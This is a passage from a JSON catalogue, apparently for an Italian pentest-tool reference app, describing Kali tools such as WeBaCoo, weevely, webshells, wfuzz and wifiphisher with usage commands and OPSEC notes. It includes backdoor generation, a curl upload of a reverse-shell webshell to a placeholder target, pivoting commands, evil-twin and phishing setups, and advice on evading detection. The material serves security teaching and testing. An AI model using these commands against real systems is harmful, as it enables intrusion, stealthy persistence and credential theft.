interagire con la backdoor remota. Il client gestisce automaticamente l'encoding/decoding della comunicazione e supporta comandi di sistema arbitrari. Include funzionalita di upload e download file attraverso lo stesso canale cookie.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WeBaCoo opera in due modalita: generazione della backdoor e connessione al target compromesso.</p><pre><code># Generazione della backdoor PHP\nwebacoo -g -o backdoor.php\n\n# Generazione con offuscamento avanzato\nwebacoo -g -o backdoor.php -f 3 -r RANDOMSEED\n\n# Connessione alla backdoor remota\nwebacoo -t -u http://target.com/uploads/backdoor.php\n\n# Connessione tramite proxy\nwebacoo -t -u http://target.com/backdoor.php -p 127.0.0.1:8080</code></pre><p>Dopo la connessione, si ottiene una shell interattiva con cui eseguire comandi sul server remoto. I risultati vengono restituiti tramite il canale cookie in modo trasparente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di post-exploitation su server web, WeBaCoo viene utilizzato per mantenere un accesso persistente e difficile da rilevare, sfruttando il canale cookie che non viene tipicamente monitorato da WAF basati su firma. Durante penetration test dove il traffico viene ispezionato da proxy aziendali, la comunicazione via cookie permette di evitare il rilevamento basato su content inspection dei body HTTP. WeBaCoo e utile anche per stabilire un canale di comunicazione secondario quando le webshell tradizionali vengono bloccate da regole di filtering sui parametri delle richieste.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il file PHP della backdoor puo essere identificato da scanner di malware e soluzioni di file integrity monitoring. I cookie con valori Base64 di dimensioni anomale possono essere rilevati da sistemi di analisi del traffico avanzati.</p><p><strong>Impatto operativo:</strong> La comunicazione via cookie ha limiti di dimensione (tipicamente 4KB per cookie), restringendo la lunghezza dei comandi e delle risposte. La backdoor richiede che il server supporti PHP e che i cookie vengano correttamente processati.</p><p><strong>Mitigazioni:</strong> Inserire la backdoor in file PHP esistenti piuttosto che creare nuovi file. Utilizzare nomi di cookie che imitano quelli dell'applicazione legittima. Ruotare periodicamente la backdoor con nuovi delimitatori e seed di offuscamento.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "webshells",
    "name": "webshells",
    "version": "1.1",
    "icon": "../app/icons/webshells-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/webshells/",
    "desc": "Collezione di webshell PHP, ASP, JSP, ASPX per post-exploitation su server web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Webshells e una collezione curata di web shell in diversi linguaggi di programmazione server-side tra cui PHP, ASP, ASPX, JSP e Perl. Questa raccolta include shell di varia complessita, da script minimali a interfacce web complete con file manager, database browser e terminali interattivi. Le webshell sono strumenti fondamentali nella fase di post-exploitation per mantenere l'accesso a server web compromessi e per eseguire operazioni sul sistema target. La collezione presente in Kali Linux fornisce ai penetration tester un arsenale pronto all'uso di backdoor web per diversi stack tecnologici. Ogni webshell offre funzionalita diverse in termini di dimensioni, capacita e livello di offuscamento.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Supporto multi-linguaggio:</strong> La collezione include webshell per tutti i principali linguaggi server-side: PHP per server Apache/NGINX, ASP/ASPX per IIS, JSP per Tomcat/JBoss e Perl per server CGI. Ogni linguaggio offre shell ottimizzate per le funzionalita specifiche della piattaforma target. La varieta permette di selezionare la webshell piu appropriata per lo stack tecnologico incontrato.</p><p><strong>Funzionalita avanzate:</strong> Alcune webshell della collezione includono interfacce grafiche web complete con file manager, editor di testo, browser di database, esecuzione di query SQL e terminali interattivi. Altre sono progettate per essere minimali (poche righe di codice) per facilitare l'inserimento furtivo in file esistenti. Le shell avanzate come c99 e r57 offrono funzionalita complete di system administration remota.</p><p><strong>Versatilita operativa:</strong> Le webshell permettono di eseguire comandi di sistema, navigare il filesystem, caricare e scaricare file, e gestire processi sul server target. Alcune includono funzionalita di port scanning, reverse shell e brute forcing di credenziali. La collezione copre scenari che vanno dal semplice command execution alla completa compromissione del server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Le webshell vengono caricate sul server target attraverso vulnerabilita di upload o altre tecniche di exploitation.</p><pre><code># Localizzare le webshell disponibili in Kali\nls /usr/share/webshells/\n\n# Webshell PHP minimale (one-liner)\ncat /usr/share/webshells/php/simple-backdoor.php\n\n# Upload tramite vulnerabilita di file upload\ncurl -F \"file=@/usr/share/webshells/php/php-reverse-shell.php\" http://target.com/upload.php\n\n# Webshell ASP per server IIS\nls /usr/share/webshells/asp/</code></pre><p>Dopo il caricamento, la webshell e accessibile tramite browser o strumenti come curl. E importante adattare i parametri (IP, porta) prima dell'upload e verificare la compatibilita con la versione del linguaggio sul server target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Dopo aver sfruttato una vulnerabilita di file upload in un'applicazione web, le webshell della collezione vengono utilizzate per stabilire un punto di accesso persistente al server, permettendo l'esecuzione di comandi e l'esplorazione del filesystem. In scenari dove il target utilizza stack tecnologici diversi (PHP su Linux, ASPX su Windows), la collezione multi-linguaggio permette di selezionare la shell appropriata senza dover sviluppare codice personalizzato. Durante red team engagement, le webshell minimali vengono inserite in file legittimi dell'applicazione per mantenere accesso furtivo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le webshell della collezione sono ampiamente note e le loro firme sono presenti in tutti i principali antivirus, WAF e scanner di malware come ClamAV e YARA rules dedicate. Il caricamento di file con estensioni eseguibili attiva alert nella maggior parte dei sistemi di sicurezza.</p><p><strong>Impatto operativo:</strong> L'utilizzo di webshell note senza modifiche rende il rilevamento quasi certo in ambienti con monitoraggio attivo. Le webshell con interfacce grafiche complesse hanno dimensioni elevate che le rendono facilmente identificabili.</p><p><strong>Mitigazioni:</strong> Modificare le webshell prima dell'uso per evitare le firme note, cambiando nomi di variabili, funzioni e stringhe identificative. Utilizzare webshell minimali e offuscare il codice. Eliminare la webshell dopo l'uso e preferire canali di accesso alternativi per la persistenza.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "websploit",
    "name": "websploit",
    "version": "4.0.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/websploit/",
    "desc": "Framework per vulnerability scanning e exploit web con moduli automatizzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WebSploit e un framework open-source per vulnerability scanning e exploitation di applicazioni web, progettato con un'architettura modulare simile a Metasploit. Lo strumento integra diversi moduli per attacchi web tra cui scanning di directory, injection SQL, cross-site scripting e attacchi man-in-the-middle. WebSploit offre un'interfaccia interattiva a linea di comando con comandi intuitivi per la selezione e configurazione dei moduli. Il framework include anche moduli per attacchi di rete come ARP spoofing, DNS spoofing e MITM per l'intercettazione del traffico. La struttura modulare permette l'estensione con moduli personalizzati scritti in Python.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Moduli web exploitation:</strong> WebSploit include moduli per directory brute-forcing, form brute-forcing, attacchi a CMS noti e scanning di vulnerabilita web comuni. I moduli automatizzano la fase di discovery e exploitation con parametri configurabili per ogni target. Supporta l'integrazione con proxy per l'analisi del traffico generato durante i test.</p><p><strong>Attacchi di rete integrati:</strong> Il framework include moduli per ARP poisoning, DNS spoofing e MITM che permettono di intercettare e manipolare il traffico di rete. Questi moduli sono particolarmente utili per attacchi su reti locali dove l'attaccante ha gia accesso al segmento di rete. L'integrazione di attacchi web e di rete nello stesso framework semplifica scenari di attacco complessi.</p><p><strong>Interfaccia modulare:</strong> L'interfaccia CLI segue lo stile di Metasploit con comandi come use, set, show options e run per la selezione e l'esecuzione dei moduli. Ogni modulo ha opzioni configurabili documentate e valori di default sensati. Il framework supporta la creazione di script automatizzati per l'esecuzione sequenziale di moduli multipli.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WebSploit si avvia con un'interfaccia interattiva dove si selezionano e configurano i moduli desiderati.</p><pre><code># Avvio del framework\nwebsploit\n\n# Elenco moduli disponibili\nshow modules\n\n# Selezione modulo di directory scanning\nuse web/dir_scanner\n\n# Configurazione target\nset TARGET http://target.com\nset WORDLIST /usr/share/wordlists/dirb/common.txt\n\n# Esecuzione del modulo\nrun</code></pre><p>I risultati vengono visualizzati in tempo reale nella console. Ogni modulo puo avere opzioni specifiche visualizzabili con il comando show options dopo la selezione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>WebSploit viene utilizzato come framework unificato per combinare attacchi web e di rete durante penetration test su reti locali, ad esempio eseguendo ARP spoofing per intercettare traffico e contemporaneamente testando vulnerabilita web sulle applicazioni scoperte. In scenari di assessment rapido, i moduli automatizzati permettono di verificare velocemente vulnerabilita comuni su applicazioni web senza dover configurare strumenti separati. Il framework e utile per attivita didattiche e laboratori di sicurezza grazie alla sua interfaccia intuitiva e alla documentazione integrata dei moduli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I moduli di scanning generano traffico facilmente identificabile da IDS/IPS e WAF, con pattern di richieste ripetitive e user-agent riconoscibili. Gli attacchi ARP/DNS spoofing sono rilevabili da sistemi di monitoraggio di rete come arpwatch e DNSSEC.</p><p><strong>Impatto operativo:</strong> Gli attacchi MITM possono destabilizzare la rete locale e interrompere le comunicazioni di altri utenti. I moduli di brute-forcing generano un volume elevato di richieste che puo causare rallentamenti sul target.</p><p><strong>Mitigazioni:</strong> Limitare la velocita delle scansioni per ridurre l'impatto e il rilevamento. Utilizzare i moduli di rete solo su segmenti di rete autorizzati. Personalizzare gli user-agent e i pattern delle richieste per ridurre la detectability.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "weevely",
    "name": "weevely",
    "version": "4.0.2",
    "icon": "../app/icons/weevely-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/weevely/",
    "desc": "Webshell PHP stealth con crittografia, 30+ moduli per post-exploitation avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Weevely</strong> è una webshell PHP stealth progettata per post-exploitation avanzata. Genera backdoor offuscate con comunicazione crittografata e offre 30+ moduli per file management, pivoting, privilege escalation e persistence su server web compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Encrypted Communication:</strong> traffico C2 crittografato nascosto in parametri legittimi</p><p><strong>30+ Modules:</strong> file manager, port scanner, SQL client, bruteforcer integrati</p><p><strong>Obfuscated Agent:</strong> backdoor PHP minimale e offuscata per evitare detection</p><p><strong>Pivoting:</strong> tunnel TCP e proxy SOCKS per accesso a rete interna</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera backdoor con obfuscation avanzata\nweevely generate Str0ngP4ss! /tmp/agent.php\n\n# Connetti e avvia sessione interattiva\nweevely http://target.com/uploads/agent.php Str0ngP4ss!\n\n# Moduli post-exploitation avanzati:\n:system_info              # Info sistema\n:audit_phpconf            # Audit configurazione PHP\n:file_find / -name *.conf # Cerca file configurazione\n:sql_console -user root -passwd '' -host localhost  # MySQL shell\n\n# Pivoting: crea tunnel SOCKS\n:net_proxy                # SOCKS5 per accesso rete interna\nproxychains nmap -sT 10.0.0.0/24\n\n# Port forwarding per accesso servizi interni\n:net_portfwd -lport 3306 -rhost 10.0.0.5 -rport 3306\nmysql -h 127.0.0.1 -P 3306 -u root\n\n# Privilege escalation enumeration\n:audit_suidsgid           # Trova SUID/SGID\n:audit_etcpasswd          # Check permessi /etc/passwd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Stealth Persistence</strong>, mantenere accesso con comunicazioni crittografate difficili da rilevare.</p><p>Per <strong>Post-Exploitation</strong>, eseguire reconnaissance e lateral movement da server web.</p><p>Per <strong>Pivoting</strong>, usare server compromesso come punto di ingresso nella rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> file PHP può essere trovato da scansioni AV server-side. Pattern di comunicazione, seppur crittografati, hanno caratteristiche rilevabili. Moduli aggressivi generano attività anomala. Usare con cautela e cleanup appropriato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "wfuzz",
    "name": "wfuzz",
    "version": "3.1.0",
    "icon": "../app/icons/wfuzz-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wfuzz/",
    "desc": "Fuzzer web per brute force directory, parametri, header e autenticazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wfuzz</strong> è un fuzzer web flessibile per brute force di directory, parametri, header e autenticazione. Supporta injection di payload in qualsiasi parte della request HTTP con filtering avanzato delle risposte per identificare risultati interessanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Position Fuzzing:</strong> inietta payload in URL, header, body, cookie simultaneamente</p><p><strong>Advanced Filtering:</strong> filtra risposte per status code, lunghezza, parole, linee, regex</p><p><strong>Encoders:</strong> encoding automatico dei payload (URL, base64, HTML, hash)</p><p><strong>Recursion:</strong> fuzzing ricorsivo per directory discovery approfondita</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory bruteforce con estensioni multiple\nwfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -z list,-.php-.html-.txt-.bak --hc 404 http://target.com/FUZZFUZ2Z\n\n# IDOR testing con range numerico\nwfuzz -c -z range,1-1000 --hc 403,404 --hh 0 http://target.com/api/user/FUZZ/profile\n\n# Auth bypass con header injection\nwfuzz -c -w /usr/share/seclists/Fuzzing/headers-injection.txt \\\n  -H \"X-Forwarded-For: FUZZ\" --hc 403 http://target.com/admin\n\n# Subdomain bruteforce via Host header\nwfuzz -c -w subdomains.txt -H \"Host: FUZZ.target.com\" --hc 404 --hw 0 http://target.com\n\n# SQLi fuzzing su parametro POST\nwfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \\\n  -d \"username=admin&amp;password=FUZZ\" --hs \"Invalid\" http://target.com/login\n\n# Recursive discovery con output JSON\nwfuzz -c -R 2 -w wordlist.txt --hc 404 -o json http://target.com/FUZZ 2&gt;results.json\n\n# Multi-threading con delay per evasione\nwfuzz -c -t 5 -s 0.5 -w wordlist.txt --hc 404 http://target.com/FUZZ</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trovare file, directory e endpoint nascosti.</p><p>Per <strong>Parameter Brute Force</strong>, identificare parametri accettati da endpoint.</p><p>Per <strong>Auth Testing</strong>, testare credenziali e bypass autenticazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> alto volume di request genera alert su WAF e IDS. Pattern di fuzzing sono facilmente identificabili. Rate limiting può bloccare scansione. Usare delay tra request e proxy rotation per ridurre detection.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "whatweb",
    "name": "whatweb",
    "version": "0.6.2",
    "icon": "../app/icons/whatweb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/whatweb/",
    "desc": "Identifica tecnologie web: CMS, framework, server, plugin con 1800+ fingerprint.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WhatWeb</strong> è uno scanner di fingerprinting web che identifica tecnologie utilizzate dai siti web. Con oltre 1800 plugin integrati riconosce CMS, framework, server web, librerie JavaScript, widget, piattaforme e-commerce, analytics e centinaia di altre componenti analizzando header HTTP, contenuto HTML, cookie, comportamenti specifici e pattern unici. È uno strumento essenziale nella fase di reconnaissance per comprendere lo stack tecnologico di un target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>1800+ Detection Plugins:</strong> riconoscimento esteso di CMS (WordPress, Joomla, Drupal, Magento), framework (Laravel, Django, Rails, Spring), server (Apache, nginx, IIS), analytics (Google Analytics, Matomo), CDN (Cloudflare, Akamai), WAF e molto altro con aggiornamenti continui della community.</p><p><strong>Aggression Levels:</strong> quattro livelli di aggressività da stealthy (singola request, minimo footprint) ad aggressive (multiple probe, path brute force) per bilanciare detection rate e stealth in base al contesto operativo.</p><p><strong>Version Detection:</strong> identifica versioni specifiche di software tramite changelog, hash di file statici, header e pattern HTML per vulnerability matching preciso e ricerca CVE mirata.</p><p><strong>Flexible Output Formats:</strong> output in JSON, XML, SQL, MongoDB, brief e verbose per integrazione in pipeline automatizzate, database di asset e tool di reporting.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singolo target con output standard\nwhatweb https://target.com\n\n# Scan aggressivo livello 3 per maximum detection\nwhatweb -a 3 -v https://target.com\n\n# Output JSON per integrazione pipeline\nwhatweb --log-json=output.json https://target.com\n\n# Scan range IP con throttling\nwhatweb --wait=2 192.168.1.0/24\n\n# Scan da file di URL\nwhatweb -i urls.txt --log-json=results.json\n\n# Con custom User-Agent e proxy\nwhatweb -U \"Mozilla/5.0 (Windows NT 10.0)\" --proxy http://127.0.0.1:8080 https://target.com\n\n# Solo plugin specifici\nwhatweb -p WordPress,Apache https://target.com\n\n# Verbose con colori per analisi manuale\nwhatweb -v --color=always https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Technology Profiling</strong>, mappare completamente lo stack tecnologico di applicazioni web target identificando CMS, framework, server, librerie frontend e servizi third-party per pianificare vettori di attacco specifici.</p><p>Per <strong>Vulnerability Research</strong>, identificare versioni esatte di software per cercare CVE note, exploit pubblici e configurazioni vulnerabili conosciute, correlando con database come NVD e Exploit-DB.</p><p>Per <strong>Asset Discovery Enterprise</strong>, catalogare tecnologie su range di IP aziendali per inventory management, compliance checking e identificazione di shadow IT non autorizzato.</p><p>Per <strong>Bug Bounty Reconnaissance</strong>, profilare rapidamente target di programmi bug bounty per identificare tecnologie con history di vulnerabilità note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> livello aggressivo genera multiple request rilevabili da WAF e IDS. User-Agent WhatWeb è signature nota facilmente identificabile. Scansione di range genera traffico anomalo che può triggare alert. Usare livello passivo (aggression 1), custom User-Agent, proxy rotation e throttling per ridurre fingerprint durante operazioni stealth.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "wifi-honey",
    "name": "wifi-honey",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifi-honey/",
    "desc": "Crea fake AP per cattura handshake WPA/WPA2 con deauth e beacon spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WiFi-Honey</strong> è uno script specializzato che automatizza la creazione di rogue access point (evil twin) per catturare handshake WPA/WPA2. Configura intelligentemente multiple interfacce wireless virtuali per creare AP fake con lo stesso ESSID del target mentre simultaneamente esegue attacchi deauth coordinati per forzare i client a riconnettersi all'access point malevolo. È un tool essenziale per wireless penetration testing che semplifica setup complessi di attacchi evil twin.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated Rogue AP Setup:</strong> crea automaticamente access point fake con ESSID identico al target, configurando hostapd, dnsmasq e le interfacce necessarie senza intervento manuale per rapid deployment durante engagement.</p><p><strong>Coordinated Deauth Attack:</strong> esegue attacchi deauthentication simultanei contro i client connessi al vero AP usando aireplay-ng, forzandoli a cercare un nuovo access point e connettersi al rogue AP controllato dall'attaccante.</p><p><strong>4-Way Handshake Capture:</strong> cattura automaticamente il 4-way handshake WPA/WPA2 quando i client si riconnettono, salvando i dati in formato compatibile con aircrack-ng e hashcat per offline password cracking.</p><p><strong>Multi-Interface Orchestration:</strong> gestisce multiple interfacce wireless simultaneamente - una per il rogue AP, una per il deauth attack, e opzionalmente una per monitoring - coordinando le operazioni per massimizzare l'efficacia dell'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifi-honey con parametri base\nwifi-honey &lt;essid&gt; &lt;channel&gt; &lt;interface&gt;\n\n# Esempio attacco a rete \"CorporateWiFi\" su canale 6\nwifi-honey CorporateWiFi 6 wlan0\n\n# Con interfaccia specifica per monitoring\nwifi-honey TargetNetwork 11 wlan0 wlan1\n\n# Monitora handshake catturati in real-time\nairodump-ng --bssid &lt;rogue_mac&gt; -c &lt;channel&gt; -w capture wlan0mon\n\n# Verifica cattura handshake\naircrack-ng capture*.cap\n\n# Crack offline con wordlist\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Penetration Testing</strong>, testare la resistenza di reti wireless aziendali ad attacchi evil twin verificando se i client si connettono automaticamente ad AP non autorizzati.</p><p>Per <strong>WPA/WPA2 Password Audit</strong>, ottenere handshake per password cracking offline e verificare la robustezza delle passphrase wireless contro attacchi dictionary e brute force.</p><p>Per <strong>Client Security Assessment</strong>, verificare il comportamento dei dispositivi client quando presentati con AP duplicati, testando se validano correttamente i certificati o si connettono ciecamente.</p><p>Per <strong>Security Awareness Training</strong>, dimostrare visivamente i rischi degli attacchi evil twin durante training di security awareness per utenti e IT staff.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> beacon frame duplicati con stesso ESSID ma BSSID diverso sono facilmente rilevabili da WIDS enterprise. Deauth flood genera alert immediati su sistemi di monitoring wireless. Richiede prossimità fisica al target (range wireless). Interferenza RF anomala può essere localizzata con equipment di spectrum analysis. Usare solo con autorizzazione esplicita in ambiente controllato durante penetration test autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifiphisher",
    "name": "wifiphisher",
    "version": "1.4",
    "icon": "../app/icons/wifiphisher-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifiphisher/",
    "desc": "Framework rogue AP per phishing WiFi: cattura credenziali con captive portal fake.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wifiphisher e un framework per attacchi rogue access point progettato per condurre campagne di phishing WiFi. Lo strumento automatizza la creazione di access point falsi che imitano reti WiFi legittime, combinando tecniche di deauthentication per disconnettere i client dalla rete reale e indirizzarli verso il rogue AP. Wifiphisher include captive portal personalizzabili che imitano pagine di aggiornamento firmware, login di provider internet e portali di autenticazione per catturare credenziali. Il framework supporta diversi scenari di attacco pre-configurati e permette la creazione di template personalizzati. Lo strumento richiede due interfacce wireless: una per il jamming e una per il rogue AP.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Rogue AP automatizzato:</strong> Wifiphisher configura automaticamente un access point falso con lo stesso SSID e parametri della rete target, gestendo DHCP, DNS e il routing del traffico. Il framework esegue deauthentication sulla rete legittima per forzare i client a riconnettersi al rogue AP. La transizione e trasparente per l'utente che vede apparire la rete conosciuta con segnale migliore.</p><p><strong>Scenari di phishing pre-configurati:</strong> Il framework include diversi scenari di attacco pronti all'uso tra cui pagine di aggiornamento firmware del router, portali OAuth di Google/Facebook, pagine di login ISP e aggiornamenti di plugin browser. Ogni scenario e progettato per essere convincente e adattabile a diversi contesti. E possibile creare scenari completamente personalizzati con HTML, CSS e JavaScript.</p><p><strong>Cattura credenziali:</strong> Wifiphisher intercetta e registra tutte le credenziali inserite nei captive portal, incluse password WiFi, credenziali di account e informazioni personali. Il framework supporta il logging dettagliato di ogni interazione dell'utente con il portal. I dati catturati vengono salvati in formato strutturato per analisi successiva.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Wifiphisher richiede due adattatori WiFi e permessi di root per la gestione delle interfacce wireless.</p><pre><code># Avvio con selezione interattiva del target\nsudo wifiphisher\n\n# Specifica interfaccia e scenario\nsudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade\n\n# Target specifico con ESSID noto\nsudo wifiphisher --essid \"TargetNetwork\" -p oauth-login\n\n# Scenario personalizzato\nsudo wifiphisher -p /path/to/custom-scenario/</code></pre><p>L'interfaccia mostra in tempo reale i client connessi, le credenziali catturate e lo stato dell'attacco. Il framework gestisce automaticamente la configurazione di rete e il DNS per reindirizzare tutto il traffico al captive portal.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In assessment di sicurezza wireless, Wifiphisher viene utilizzato per valutare la suscettibilita degli utenti aziendali ad attacchi di phishing WiFi, verificando quanti dipendenti inseriscono credenziali in captive portal falsi dopo essere stati disconnessi dalla rete legittima. Durante red team engagement, lo strumento permette di catturare la password WPA2 della rete aziendale tramite un captive portal che simula un aggiornamento del firmware del router. Wifiphisher e anche utilizzato per campagne di awareness sulla sicurezza wireless, dimostrando concretamente i rischi delle reti WiFi non protette.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La deauthentication massiva genera frame facilmente rilevabili da WIDS (Wireless Intrusion Detection Systems). Il rogue AP puo essere identificato tramite confronto di MAC address, canale e parametri con l'AP legittimo. I captive portal hanno URL e certificati diversi da quelli legittimi.</p><p><strong>Impatto operativo:</strong> L'attacco interrompe la connettivita WiFi di tutti i client nella portata del segnale, causando disservizio visibile. I frame di deauthentication sono illegali in molte giurisdizioni anche in contesti di testing autorizzato.</p><p><strong>Mitigazioni:</strong> Limitare l'attacco a client specifici invece della deauthentication massiva. Eseguire i test in orari di minimo utilizzo della rete. Verificare la legalita dei frame di deauthentication nella giurisdizione locale e ottenere autorizzazione scritta specifica per test wireless.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifipumpkin3",
    "name": "wifipumpkin3",
    "version": "1.1.7",
    "icon": "../app/icons/wifipumpkin3-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifipumpkin3/",
    "desc": "Rogue AP framework con proxy, credential capture, MITM e plugin extensibility.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WiFi-Pumpkin3 e un framework completo per la creazione di rogue access point con funzionalita avanzate di man-in-the-middle, intercettazione di credenziali e iniezione di contenuto. Lo strumento e scritto in Python 3 e offre un'architettura a plugin estensibile che permette di aggiungere moduli personalizzati per proxy, sniffer e captive portal. WiFi-Pumpkin3 gestisce automaticamente la configurazione di hostapd, DHCP e DNS per creare un access point completo e operativo. Il framework include proxy trasparenti per HTTP e HTTPS, moduli per la cattura di credenziali e strumenti per l'iniezione di codice JavaScript nelle pagine web. L'interfaccia supporta sia la modalita interattiva che l'automazione tramite script.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Proxy trasparente e MITM:</strong> WiFi-Pumpkin3 include proxy trasparenti per HTTP che permettono di intercettare, visualizzare e modificare il traffico web dei client connessi al rogue AP. I moduli proxy supportano l'iniezione di codice JavaScript, il downgrade HTTPS e la sostituzione di contenuto in tempo reale. Il traffico intercettato viene registrato con dettagli completi per analisi forensica successiva.</p><p><strong>Architettura a plugin:</strong> Il framework supporta plugin personalizzati per estendere le funzionalita di proxy, sniffing e captive portal. I plugin possono essere sviluppati in Python seguendo l'API documentata e caricati dinamicamente. Sono disponibili plugin pre-installati per cattura di immagini, credential harvesting e DNS spoofing.</p><p><strong>Captive portal personalizzabile:</strong> WiFi-Pumpkin3 include un sistema di captive portal con template predefiniti per phishing di credenziali WiFi, login social e portali aziendali. I template sono completamente personalizzabili con HTML, CSS e JavaScript. Il framework gestisce automaticamente il redirect dei client verso il captive portal al momento della connessione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WiFi-Pumpkin3 si avvia come framework interattivo o in modalita daemon per operazioni prolungate.</p><pre><code># Avvio interfaccia interattiva\nsudo wifipumpkin3\n\n# Configurazione access point\nset interface wlan0\nset ssid \"FreeWiFi\"\nset proxy noproxy\n\n# Avvio con proxy di sniffing\nset proxy pumpkinproxy\nstart\n\n# Avvio da linea di comando con parametri\nsudo wifipumpkin3 --xpulp \"set interface wlan0; set ssid FreeWiFi; set proxy pumpkinproxy; start\"</code></pre><p>Il framework mostra in tempo reale i client connessi, il traffico intercettato e le credenziali catturate. I log vengono salvati in formato strutturato per analisi successiva.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante assessment di sicurezza wireless enterprise, WiFi-Pumpkin3 viene utilizzato per creare un rogue AP che simula la rete guest aziendale, intercettando il traffico dei dipendenti che si connettono per verificare l'esposizione di credenziali e dati sensibili su canali non cifrati. In scenari di red teaming, il framework permette di iniettare codice JavaScript malevolo nelle pagine web visitate dai client per lanciare attacchi browser-based come il furto di cookie di sessione. Lo strumento e utilizzato anche per test di awareness, dimostrando ai dipendenti i rischi della connessione a reti WiFi non verificate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il rogue AP e rilevabile da sistemi WIDS enterprise che monitorano la comparsa di nuovi access point non autorizzati. Il traffico di proxy e l'iniezione di contenuto generano anomalie rilevabili da soluzioni di endpoint protection sui client.</p><p><strong>Impatto operativo:</strong> L'operazione richiede un adattatore WiFi compatibile con la modalita AP e potrebbe interferire con reti wireless legittime nelle vicinanze. Il downgrade HTTPS genera warning nei browser moderni che 